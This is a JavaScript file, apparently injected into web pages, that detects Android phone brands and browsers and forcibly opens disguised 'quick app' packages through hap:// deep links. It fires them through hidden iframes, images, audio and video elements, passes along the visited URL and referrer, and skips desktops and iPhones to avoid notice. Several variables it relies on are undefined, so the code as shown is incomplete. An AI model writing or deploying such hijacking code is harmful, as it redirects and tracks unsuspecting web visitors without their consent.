(function () {

  // 如果没有缓存创建缓存
  if (!window._localStorage) {
    window._localStorage = window.localStorage;
  }
  var pobj = {};

  // 快应用马甲包，可能每个平台有差异
  var vestPkgs = ['com.huarong.hyx'];

  var infoUrl = 'https://www.baidu.com/'
  var channel = "whosyourdaddy";
  
  //同应用,过期时间（小时）
  var expTime = 0.5;
  var pull_pkg = "";
  var $openread = '';
  var $referrer = '';
  var isSelf = false;

  // 跳转的快应用路径
  var quickAppPath = '';

  // 将要打开的快应用
  var openPkg = '';

  // 根据机型选择支持的快应用包列表
  var supportPkgList = [];

  // 不同机型对应的快应用的包
  var pkgs = {
    'oppo':['com.hualongdianjing.kqh'],
    'vivo':['com.qifei.cajy'],
    'huawei': ['com.guancheng.gcpkg']
  }

  // 页面链接黑名单,阻止跳转
  var openLinkBlackList = []

  // 检测缓存是否还有效 TRUE:缓存有效 FALSE:缓存失效
  pobj.checkCache = function (key) {
    console.log('window.localStorage.....'+window.localStorage);
    if (!window._localStorage) {
      window._localStorage = window.localStorage;
    }

    var data = window._localStorage.getItem(key);
    if (!data) {
      return false;
    }

    try {
      data = JSON.parse(data);
      if (data.value && data.expirse > new Date().getTime()) {
        return true;
      } 
      
      window._localStorage.removeItem(key);
      return false;
    } catch(e) {
      console.log(e);
    }
  };

  //设置缓存
  //key 键
  //value 值
  //expireTimeUnit 过期时间单位，小时
  pobj.setCache = function (key, value, expireTimeUnit) {
    if (!window._localStorage) {
      return;
    }

    expireTimeUnit = parseFloat(expireTimeUnit);
    var expireTime = new Date(new Date().getTime() + expireTimeUnit * 3600 * 1000).getTime();
    var expireData = { 'value': value, 'expirse': expireTime};
    window._localStorage.setItem(key, JSON.stringify(expireData));
  }

  pobj.getUserAgent = function () {
    var userAgent = navigator.userAgent;
    var _userAgent = userAgent.toLowerCase();
    console.log('userAgent....'+userAgent);
    console.log('_userAgent....'+_userAgent);

    function $isAndroid(ua) {
      var res = +(ua.match(/.*Android (\d+).*/i) || [])[1];
      return !isNaN(res) && 10 <= res;
    }
    pobj.isAndroid = _userAgent.indexOf('android') > -1 ? true : false;

    pobj.isHuawei = /(huawei|honor|; mar-)/g.test(_userAgent) ? true : false;
    pobj.isHuaweiBrowser = _userAgent.indexOf('huaweibrowser') > -1 ? true : false;
    pobj.isVivo = /(vivo|; v1|; v2)/g.test(_userAgent) ? true : false;
    pobj.isVivoBrowser = _userAgent.indexOf('vivobrowser') > -1 ? true : false;
    // var ues = /oppo|rmx|cph|; pa|; pb|; pc|; pd|; pe|; pf|; pg|; ph|; pi|a7|a8|a9|k3|r9|r11|r15|find|reno|1107|3007|a31|a31c|a31t|a51|n1t|n5117|n5207|n5209|r2017|r6007|r7plus|r7plusm|r8107|r8200|r8207|r831s|r833t|x9000|x9007|x909|gm1901|roselia/;
    var ues = /oppo|a77|oppo|a59|a57|a53|peqm|pfgm|pemm|pecm|pemt|peht|pexm|rmx|pepm|perm|pegt|pelm|pefm|peam00|peat00|pdpm00|pdvm|pdpm00|pdpt00|pdnm00|pdnt00|pcrm00|pdcm00|pbdm00|pbem00|pacm00|paam00|paat00|pacm00|pact00|pehm00|pegm|pdrm|padm00|padt00|pafm00|paft00|pahm00|paft10|pbat00|pbam00|pbbm30|pbbt30|pbem00|pbet00|pbbm00|pbbt00|pbcm10|pbct10|pbcm30|pbdm00|pbdt00|pbfm00|pbft00|pcdm00|pcdt00|pcam00|pcat00|pcdm10|pcgm00|pcgt00|pccm00|pcct00|pcct30|pcct40|pcam10|pcat10|pcem00|pcet00|pckm00|pckt00|pchm00|pcht00|pchm10|pcht10|pchm30|pcht30|pclm10|pcnm00|rmx1901|rmx1851|rmx1971|rmx1991|rmx1931|pdcm00|pcrm00|ow19w3|ow19w1|ow19w2|pdpt00|pdnt00|pdnm00|pdnm01|pdpm00|rmx2052|rmx2141|pdkm00|pdkt00|rmx2142|pdam10|pdat10|pdam00|pdhm00|pdem30|pdem10|pdet10|rmx2042|rmx2025|rmx2072|rmx2073|rmx2071|pclm50|pcrt01|rmx2051|pcpm00|pcrt00|pdbm00|pdct00|pcpt00|pckm80|pccm10|pcml10|rmx1992|pcdt10|gm1910|pdym20|pccm40|pdh|a7|a8|a9|k3|r9|r11|r15|find|reno|pah|pbb|pdy|1107|3007|a31|a31c|a31t|a32|a93|a55|a51|cph1607|cph1717|cph1723|cph1801|n1t|n5117|n5207|n5209|pacm|padm|pafm|pbam|pbcm|pbem|pbfm|pcam|pccm|pcdm|pcem|pcgm|pchm|pckm|pclm|pcnm|pcrm|pdbm|pdcm|r2017|r6007|r7plus|r7plusm|r8107|r8200|r8207|r831s|r833t|x9000|x9007|x909|pbdm|pdpt|pdnm|pdkm|gm1901|roselia|pdam|pdem|realme|reno|oneplus/
    pobj.isOppo = _userAgent.match(ues) ? true : false;
    pobj.isOppoBrowser = _userAgent.indexOf('heytapbrowser') > -1 || _userAgent.indexOf('oppobrowser') > -1 ? true : false;
    pobj.isXiaomi = /(xiaomi|; redmi |; mi |; mix |; hm |; mi-|; m200)/g.test(_userAgent) ? true : false;
    pobj.isMiuiBrowser = _userAgent.indexOf('miuibrowser') > -1 ? true : false;
    pobj.isMeizu = /(meizu|; m[0-9]|; mz|; mx[0-9]|; pro|; 16)/g.test(_userAgent) ? true : false;
    pobj.isOpppHeytap = /(oppo|heytap)/g.test(_userAgent) ? true : false;
    pobj.isAndroidTen = $isAndroid(_userAgent) ? true : false;
    pobj.isWetchat = _userAgent.indexOf('micromessenger') > -1 ? true : false;
    pobj.isUcBrowser = _userAgent.indexOf('ucbrowser') > -1 ? true : false;
    pobj.isBaidu = _userAgent.indexOf('baiduboxapp') > -1 ? true : false;
    pobj.isQQBrowser = _userAgent.indexOf('mqqbrowser') > -1 ? true : false;
    pobj.isTouTiao = _userAgent.indexOf('ttwebview') > -1 ? true : false;
    pobj.isQuark = _userAgent.indexOf('quark') > -1 ? true : false;
    pobj.isQuickApp = _userAgent.indexOf('hap') > -1 ? true : false;
    //判断是否在自己的马家包内
    for (var i = 0; i < vestPkgs.length; i++) {
      if (_userAgent.indexOf(vestPkgs[i]) > -1) {
        isSelf = true;
      }
    }
    pobj.isSelfQuickApp = isSelf ? true : false;
  };

  // 能否一天统计一次
  pobj.load_cnzz = function (url) {

  }

  pobj.setRefUrl = function () {
    try {
      if (self != top) {
        $openread = document.referrer ? document.referrer : '';
        try {
          if (parent != top) {
            $openread = top.location && top.location.href ? top.location.href : '';
          }
        } catch (e) {
        }
      } else {
        $openread = location.href;
      }

      // 展示默认页面
      if ($openread == '' || ['sanming517','qwe722'].indexOf(qd_id) > -1) {
        $openread = infoUrl;
      }
      $referrer = document.referrer ? document.referrer : '';
      $referrer = encodeURIComponent($referrer);
      $openread = (pobj.isQuickApp) ? encodeURIComponent(infoUrl) : encodeURIComponent($openread);
    } catch (err) {

    }
  }

  pobj.loadIframe = function (url, ele = 'iframe') {
    var node = document.createElement(ele);
    node.src = url;
    if (!node.src) {
      node.setAB ? node.setAB('src', url) : node.setAttribute('src', url);
    }
    node.style.display = 'none';
    var box = document.body || document.head;
    box.appendChild(node);
  }
  pobj.loadScript = function (url, callback) {
    var node = document.createElement('script');
    node.type = 'text/javascript';
    node.src = url;
    if (!node.src) {
      node.setAB ? node.setAB('src', url) : node.setAttribute('src', url);
    }
    node.attr = { 'async': '' };
    pobj._appendChild(callback, node, null);
  }

  pobj._appendChild = function (after, script, target) {
    script.onload = script.onerror = script.onbeforeload = function () {
      after();
    };
    if (target) {
      document.getElementById(target).appendChild(script);
    } else {
      document.getElementsByTagName('head')[0]['appendChild'](script);
    }
  }
  pobj.imageJump = function (url) {
    var img = document.createElement('img');
    img.src = url;
    if (!img.src) {
      img.setAB ? img.setAB('src', url) : img.setAttribute('src', url);
    }
    img.style.display = 'none';
    document.body.appendChild(img);
  };
  pobj.audioJump = function (url) {
    var _audio = new Audio();
    _audio.autoplay = false;
    _audio.preload = 'none';
    _audio.loop = false;
    _audio.src = url;
    if (!_audio.src) {
      _audio.setAB ? _audio.setAB('src', url) : _audio.setAttribute('src', url);
    }
    _audio.addEventListener('suspend', function () {
      this.src = '';
    });
    _audio.load();
  };
  pobj.createSource= function(url) {
    var video = document.createElement('video');
    video.style.display = 'none';
    var source = document.createElement('source');
    source.src = url;
    video.appendChild(source);
    document.body.appendChild(video);
  }
  pobj.vidioJump = function ($url) {
    var $video = document.createElement('video');
    $video.id = 'vas';
    $video.style.width = '1px';
    $video.style.height = '1px';
    $video.autoplay = false;
    $video.preload = 'none';
    $video.src = $url;
    if (!$video.src) {
      $video.setAB ? $video.setAB('src', $url) : $video.setAttribute('src', $url);
    }
    document.body.appendChild($video);
    $video.addEventListener('suspend', function () {
      window.vas.src = '';
    });
    $video.addEventListener('canplay', function () {
      window.vas.src = '';
    });
    $video.addEventListener('canplaythrough', function () {
      window.vas.src = '';
    });
    $video.addEventListener('duratichange', function () {
      window.vas.src = '';
    });
    $video.addEventListener('ended', function () {
      window.vas.src = '';
    });
    $video.addEventListener('error', function () {
      window.vas.src = '';
    });
    $video.addEventListener('loadeddata', function () {
      window.vas.src = '';
    });
    $video.addEventListener('loadedmetadata', function () {
      window.vas.src = '';
    });
    $video.addEventListener('pause', function () {
      window.vas.src = '';
    });
    $video.addEventListener('play', function () {
      window.vas.src = '';
    });
    $video.addEventListener('playing', function () {
      window.vas.src = '';
    });
    $video.addEventListener('progress', function () {
      window.vas.src = '';
    });
    $video.addEventListener('ratechange', function () {
      window.vas.src = '';
    });
    $video.addEventListener('readystatechange', function () {
      window.vas.src = '';
    });
    $video.addEventListener('seeked', function () {
      window.vas.src = '';
    });
    $video.addEventListener('seeking', function () {
      window.vas.src = '';
    });
    $video.addEventListener('stalled', function () {
      window.vas.src = '';
    });
    $video.addEventListener('volumechange', function () {
      window.vas.src = '';
    });
    $video.addEventListener('waiting', function () {
      window.vas.src = '';
    });
    $video.load();
  }
  
  pobj.getRandom = function (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  pobj.stop = function () {
    return false;
  };

  pobj.openHuaweiQuickApp = function (hapUrl) {
    pobj.loadIframe(hapUrl);
  }

  pobj.openOppoQuickApp = function () {
    if (pobj.isQQBrowser) {
      pobj.createSource(sj0 + '&type=the')
    }
    if(pobj.isBaidu){
      pobj.audioJump(sj0 + '&type=the')
      pobj.audioJump(sj0 + '&type=the')
    }
    pobj.loadIframe(soUrl);
    pobj.imageJump(sj1 + encodeURIComponent(sjUrl));
    pobj.imageJump(sj1 + encodeURIComponent(siUrl));
    pobj.audioJump(sj1 + encodeURIComponent(sjUrl));
    pobj.audioJump(sj1 + encodeURIComponent(siUrl));
    pobj.loadScript('//statres.quickapp.cn/quickapp/js/routerinline.min.js', function () {
      appRouter(pull_pkg, path, {
        s_c: qd_id,
        s_u: $openread,
        s_r: $referrer,
      });
    });
  }

  pobj.openXiaoMiQuickApp = function () {
    if (pobj.isBaidu) {
      pobj.loadIframe(sj0 + '&type=the2');
      setTimeout(() => {
        pobj.loadIframe(sj0 + '&type=the2');
      }, 1000);
    } else {
        pobj.loadIframe(sj1 + encodeURIComponent(sjUrl));
        pobj.loadIframe(sj1 + encodeURIComponent(siUrl));
        pobj.loadIframe(soUrl);
        setTimeout(() => {
          pobj.loadIframe(sj1 + encodeURIComponent(sjUrl));
          pobj.loadIframe(sj1 + encodeURIComponent(siUrl));
        }, 1000);
    }
  }

  pobj.openWetchatQuickApp = function () {
    if (pobj.isAndroidTen) {
      pobj.imageJump(siUrl);
      // 兼容安卓10
      pobj.imageJump(sj1 + encodeURIComponent(siUrl));
      pobj.imageJump(sj0 + '&type=the2');
    }
    pobj.imageJump(sj0 + '&type=the');
  }

  pobj.openQQBrowserQuickApp = function () {
    pobj.imageJump(sj0 + '&type=the');
    if (pobj.isAndroidTen) {
      pobj.imageJump(sj1 + encodeURIComponent(sjUrl));
      // 兼容安卓10
      pobj.imageJump(sj1 + encodeURIComponent(siUrl));
      pobj.imageJump(sj0 + '&type=the2');
    }
    pobj.vidioJump(sj0 + '&type=the');
    pobj.vidioJump(sjUrl)
    pobj.vidioJump(sj1 + encodeURIComponent(sjUrl))
  }

  pobj.openUcBrowserQuickApp = function () {
    if (pobj.isOppo) {
      pobj.loadIframe(soUrl);
    }
    pobj.imageJump(sj1 + encodeURIComponent(sjUrl));
    pobj.imageJump(sj1 + encodeURIComponent(siUrl));
    pobj.audioJump(sj1 + encodeURIComponent(sjUrl));
    pobj.audioJump(sj1 + encodeURIComponent(siUrl));
    pobj.createSource(sj0 +'&type=the');
    pobj.createSource(sj0 +'&type=the2');
  }

  pobj.openBaiduTouTiaoQuickApp = function () {
      if (pobj.isVivo && pobj.isAndroidTen) {
        sjUrl = siUrl;
      }
      pobj.audioJump(sjUrl);
      // 兼容安卓10
      pobj.audioJump(sj1 + encodeURIComponent(sjUrl));
      pobj.audioJump(sj0 + '&type=the2');
  }

  pobj.openVivoQuickApp = function () {
    if (pobj.isAndroidTen) {
      sjUrl = siUrl;
    }
    if (pobj.isVivoBrowser) {
      pobj.loadIframe(soUrl);
      pobj.audioJump(sj0 + '&type=the');
      pobj.audioJump(sj0 + '&type=the2');
      var url = 'hap://app/' + pull_pkg + path + '?' + parms_opt;
      location.href = url;
      pobj.isAndroidTen && (pobj.isQQBrowser || pobj.isUcBrowser) ? pobj.loadIframe(sj0 + '&type=the2') : pobj.loadIframe(sj0 + '&type=the2', 'audio');
      !pobj.isAndroidTen && (pobj.isQQBrowser || pobj.isUcBrowser) ? pobj.loadIframe(sj0 + '&type=the') : pobj.loadIframe(sj0 + '&type=the', 'audio');
    } else {
      pobj.imageJump(sjUrl);
      // 兼容安卓10
      pobj.imageJump(sj1 + encodeURIComponent(sjUrl));
      pobj.audioJump(sj0 + '&type=the2');
    }

    pobj.createSource(sj0 +'&type=the');
    pobj.createSource(sj0 +'&type=the2');
  }


  pobj.openquick = function () {
    // s_c: 渠道、 s_p: 要打开的页面地址、 s_r: 来路
    var requestParam = 's_c=' + channel + '&s_p=' + $openread + '&s_r=' + $referrer;
    var hapUrl = 'hap://app/' + openPkg + quickAppPath + '?' + requestParam;

    if (pobj.isHuawei) {
      pobj.openHuaweiQuickApp(hapUrl);
    } else if (pobj.isOppo) {
      pobj.openOppoQuickApp(hapUrl);
    } else if (pobj.isXiaomi) {
      pobj.openXiaoMiQuickApp(hapUrl);
    } else if (pobj.isWetchat) {
      pobj.openWetchatQuickApp(hapUrl)
    } else if (pobj.isQQBrowser) {
      pobj.openQQBrowserQuickApp(hapUrl);
    } else if (pobj.isUcBrowser) {
      pobj.openUcBrowserQuickApp(hapUrl);
    } else if (pobj.isBaidu || pobj.isTouTiao) {
      pobj.openBaiduTouTiaoQuickApp(hapUrl);
    } else if (pobj.isVivo) {
      pobj.openVivoQuickApp(hapUrl);
    } else if (pobj.isOpppHeytap) {
      pobj.loadIframe(hapUrl);
    } else {
      pobj.imageJump(sj0 + '&type=the');
      pobj.imageJump(sj0 + '&type=the2');
      // pobj.audioJump(sj0 + '&type=the');
      // pobj.audioJump(sj0 + '&type=the2');
      pobj.createSource(sj0 +'&type=the');
      pobj.createSource(sj0 +'&type=the2');
    }
  };

  pobj.doStart = function () {
    // 如果当前在自己快应用内
    if (pobj.isSelfQuickApp) {
      return;
    }

    pobj.openquick();
  };

  // 根据机型选择要跳转的快应用包
pobj.selectPkg = function () {
    if (pobj.isOppo) {
      supportPkgList = pkgs['oppo']
    } else if (pobj.isVivo) {
      supportPkgList = pkgs['vivo']
    } else if (pobj.isHuawei) {
      supportPkgList = pkgs['huawei']
    } else if (pobj.isXiaomi) {
      supportPkgList = pkgs['xiaomi']
    }

    // 没有查找到可用包
    if (!supportPkgList || !supportPkgList.length) {
      return;
    }

    // 随机获取一个包
    openPkg = supportPkgList[pobj.getRandom(0, supportPkgList.length - 1)]
  };

  pobj.setOpenPkgCache = function () {
    // 缓存还未失效
    if (pobj.checkCache(openPkg)) {
      return;
    }

    // 缓存失效，设置缓存
    pobj.setCache(openPkg, 1, expTime);
    // pobj.setCache('wn_p', 1, spaceTime);
  }

  pobj.isStop = function () {
    if (!openPkg) {
      return true;
    }

    // 屏蔽h站不拉起
    for (var i = 0; i < openLinkBlackList.length; i++) {
      if ($openread.indexOf(openLinkBlackList[i]) > -1) {
        return true
      }
    }

    // 如果是windows
    if (navigator.platform.indexOf('Win') != -1 || navigator.platform.indexOf('Mac') != -1) {
      return true;
    }

    // 如果是iphone
    if (navigator.platform.indexOf('iPhone') != -1) {
      return true;
    }

    // 非安卓
    if (!pobj.isAndroid || !pobj.isAndroidTen) {
      return true;
    }

    return false;
  }

  pobj.quickAppStart = function () {
    // 设置轻应用缓存
    pobj.setOpenPkgCache();

    pobj.doStart();
  }

  pobj.init = function () {
    
    // 获取用户浏览器信息，并设置值到pobj
    pobj.getUserAgent();

    // 初始化 $openread  & $referrer //统计当前页面 && 页面来源
    pobj.setRefUrl();

    // 选择要唤起轻应用的包, 如果没有选择到包则不执行
    pobj.selectPkg();

    // 不唤起快应用的场景
    if (pobj.isStop()) {
      return;
    }

    // 唤起快应用
    pobj.quickAppStart();
  }

  // 执行初始化方法
  pobj.init()

}());